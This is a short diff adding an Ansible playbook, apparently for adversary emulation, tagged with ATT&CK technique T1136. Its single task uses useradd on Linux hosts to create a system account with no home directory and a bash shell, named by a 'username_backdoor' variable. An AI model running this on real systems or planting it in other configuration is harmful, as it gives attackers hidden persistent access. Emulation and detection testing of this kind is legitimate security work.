@@ -1,0 +1,9 @@
+# attack_technique: T1136
+- name: Create Account
+  hosts: linux
+  vars_files:
+   - /opt/ansible/vars.yaml
+  tasks:
+        - name: Create a new system account
+          shell: |
+                useradd -M -N -r -s /bin/bash -c "{{ username_comment }}" {{ username_backdoor }}
